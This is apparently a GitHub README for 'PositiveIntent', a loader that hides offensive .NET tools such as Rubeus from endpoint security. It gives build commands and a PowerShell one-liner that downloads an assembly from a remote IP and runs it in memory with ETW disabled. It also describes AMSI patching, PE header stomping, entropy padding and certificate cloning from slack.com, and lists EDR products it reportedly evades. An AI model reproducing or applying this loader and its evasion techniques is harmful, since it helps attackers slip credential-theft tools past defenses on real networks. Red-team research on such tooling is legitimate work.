# PositiveIntent
> [!WARNING]  
> Beta release. Please create an issue with as much detail as possible if you run into any bugs.

## Installation (Kali/Debian-Based)

```
sudo apt update && apt install -y osslsigncode dirmngr ca-certificates gnupg
sudo echo "deb [trusted=yes] https://download.mono-project.com/repo/debian stable-buster main" | tee /etc/apt/sources.list.d/mono-official-stable.list
sudo apt update && apt install -y mono-complete
cd PositiveIntent
pip install -r requirements.txt
```

## Example Usage

```
python build.py --file ~/Rubeus.exe --hostname TEST --domain www.slack.com --args "dump /nowrap" --writetofile

[+] Obfuscated loader source files
[+] Keyed on hostname TEST
[+] Randomized loader filename
[+] Encrypted and embedded /home/kali/Rubeus.exe as a resource file
[*] Your decryption key is fgSDxBWIRQWJaIOS
[*] Building loader and adjusting entropy...please hold.
[+] Embedded 4 books as resource files
[+] Entropy of loader: 5.45
[+] Signed loader with certificate cloned from www.slack.com
[+] Loader compiled to /home/kali/PositiveIntent/temp/nJbxZAGC.exe
```

## Reflectively Loading PositiveIntent (One-Liner)

```
$si = New-Object System.Diagnostics.ProcessStartInfo -Property @{ FileName="powershell.exe"; Arguments="-Command `$bytes = (Invoke-WebRequest -Uri 'http://192.168.0.250/YJITjPVe.exe' -UseBasicParsing).Content; `$assembly = [System.Reflection.Assembly]::Load(`$bytes); `$entrypoint = `$assembly.EntryPoint; `$args = 'dump /nowrap'.Split(' '); `$entrypoint.Invoke(`$null, @(,`$args))"; RedirectStandardOutput=$true; RedirectStandardError=$true; UseShellExecute=$false; }; $si.Environment.Add("COMPlus_ETWEnabled", "0"); $process = [System.Diagnostics.Process]::Start($si); $stdout = $process.StandardOutput.ReadToEnd(); $stderr = $process.StandardError.ReadToEnd(); $process.WaitForExit(); $stdout; $stderr
```

## Detection Status
> [!NOTE]  
> Detection status is evaluated by launching the loader via RDP access (i.e. no smbexec, wmiexec, etc).  

| Vendor | Tool | Status |
| ------------- | ------------- | ------------- |
| SentinelOne | Rubeus | Undetected (03/23/2025) |
| SentinelOne | Seeker | Undetected (03/18/2025) |
| SentinelOne | Internal Monologue | Undetected (10/11/2024) |
| CrowdStrike | Rubeus | Undetected (05/07/2025) |
| CrowdStrike | Seeker | Undetected (10/11/2024) |
| CrowdStrike | Internal Monologue | Detected (Behavioral) |
| Windows Defender | Rubeus | Undetected (06/03/2025) |
| Windows Defender | Seatbelt | Undetected (10/10/2024) |
| ESET | Rubeus | Undetected (10/18/2024) |
| Carbon Black | Rubeus | Detected (Behavioral) |
| Trend Micro | Rubeus | Undetected (06/09/2025) |

## Features

-  ETW disabled via process fork with environment variable `COMPlus_ETWEnabled` set to zero. No memory patching.
-  Unique AMSI patch that targets a writable pointer to `AmsiScanBuffer` in the .data section of `clr.dll`. This means that `amsi.dll` is never touched and no memory page permissions are changed anywhere.
-  PE headers of your assembly (after it's been decrypted and loaded) are stomped to hide it from memory page scanners looking for implanted PE signatures.
-  Hostname keying. 
-  Optional flag to redirect output to an encrypted file. Useful to avoid outputting signatured text to console (e.g. tool logos).
-  Optional flag to hardcode arguments to be passed to your assembly. Useful to avoid passing signatured arguments on the command line.
-  Python pre-build script obfuscates all (most) methods, variables, strings, delegates, classes, and namespaces before building the loader (the code is disgusting don't read it please).
-  Your .NET assembly of choice (Rubeus, Seeker, etc.) is embedded in the loader as a resource file and RC4 encrypted.
-  No suspicious usage of crypto libraries - RC4 encryption/decryption is performed using a "raw" implementation of the RC4 algorithm (thanks ChatGPT).
-  No P/Invoke usage. D/Invoke only with API hashing.
- Copyright free English books are embedded as resource files in the loader to keep Shannon entropy between 4.50-5.50.
- Python post-build script signs the loader with a self-signed certificate using values cloned from a domain of your choice.
- Built with .NET Framework 4.5.1 and C# 7.3 for compatibility with various Windows versions.

## Roadmap

- ~~Add optional flag to hardcode arguments to be passed to assembly~~
- ~~Add optional flag to redirect output to an encrypted file~~
- ~~Randomize encryption key per build~~
- Refactor Python pre-build scripts (a complete mess)
- Dynamically generate & randomize `assemblyinfo.cs`
- Add option to key on AD domain
- Improve error handling where possible

## References
[Anatomy of a .NET Assembly – The DOS Stub](https://www.red-gate.com/simple-talk/blogs/anatomy-of-a-net-assembly-the-dos-stub/)  
[A Dive Into the PE File Format](https://0xrick.github.io/win-internals/pe3)  
[Hiding your .NET - ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw/)  
[Red Team Tradecraft: Loading Encrypted C# Assemblies In Memory](https://www.mike-gualtieri.com/posts/red-team-tradecraft-loading-encrypted-c-sharp-assemblies-in-memory)  
[Building, Modifying, and Packing with Azure DevOps](https://blog.xpnsec.com/building-modifying-packing-devops/)  
[DeepSeek](https://deepseek.com/) (THE GOAT)  
[ChatGPT](https://chatgpt.com/)  
